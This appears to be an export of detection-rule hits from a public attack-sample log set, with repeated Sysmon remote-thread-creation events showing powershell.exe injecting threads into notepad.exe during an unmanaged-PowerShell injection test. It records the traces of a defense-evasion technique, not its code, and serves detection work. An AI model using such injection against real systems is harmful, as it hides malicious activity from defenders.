2019-05-18T17:16:16.630046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18675,IEWIN7,"TargetProcessId: 2840
NewThreadId: 272
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.630
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.661296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18676,IEWIN7,"TargetProcessId: 2840
NewThreadId: 536
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.645
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.692546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18677,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2920
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.692
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.708171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18678,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1860
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.708
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.723796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18679,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2044
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.723
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.739421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18680,IEWIN7,"TargetProcessId: 2840
NewThreadId: 456
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.739
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.755046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18681,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2512
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.755
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.770671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18682,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1276
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.770
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.801921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18683,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2208
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.801
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.817546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18684,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2452
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.817
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.833171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18685,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2416
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.833
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.848796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18686,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2940
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.848
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.864421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18687,IEWIN7,"TargetProcessId: 2840
NewThreadId: 936
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.864
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.880046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18688,IEWIN7,"TargetProcessId: 2840
NewThreadId: 684
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.880
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.895671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18689,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1392
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.895
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.926921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18690,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1512
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.926
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.942546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18691,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3148
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.942
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.973796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18692,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2872
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.973
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:16.989421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18693,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2056
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:16.989
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.005046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18694,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1564
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.005
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.020671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18695,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1516
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.020
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.036296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18696,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1168
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.036
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.051921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18697,IEWIN7,"TargetProcessId: 2840
NewThreadId: 600
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.051
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.083171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18698,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2836
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.083
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.098796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18699,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1348
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.098
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.114421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18700,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3388
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.114
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.130046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18701,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3380
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.130
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.145671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18702,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3400
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.145
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.161296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18703,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3460
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.161
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.176921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18704,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3568
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.176
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.192546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18705,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3340
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.192
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.208171+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18706,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3008
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.208
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.223796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18707,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2224
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.223
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.239421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18708,IEWIN7,"TargetProcessId: 2840
NewThreadId: 880
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.239
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.270671+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18709,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2980
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.270
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.286296+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18710,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3896
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.286
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.301921+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18711,IEWIN7,"TargetProcessId: 2840
NewThreadId: 2984
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.301
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.317546+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18712,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3940
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.317
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.348796+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18713,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3964
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.348
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.364421+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18714,IEWIN7,"TargetProcessId: 2840
NewThreadId: 1084
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.364
TargetImage: C:\Windows\System32\notepad.exe
"
2019-05-18T17:16:17.380046+00:00,Remote Thread Creation In Uncommon Target Image,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx,1,Microsoft-Windows-Sysmon,8,18715,IEWIN7,"TargetProcessId: 2840
NewThreadId: 3268
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3D1B-5CE0-0000-0010C3840B00
SourceProcessGuid: 365ABB72-3D37-5CE0-0000-001013DC0B00
StartFunction: ''
SourceProcessId: 2108
StartAddress: '0x00590000'
StartModule: ''
UtcTime: 2019-05-18 17:16:17.380
TargetImage: C:\Windows\System32\notepad.exe
"
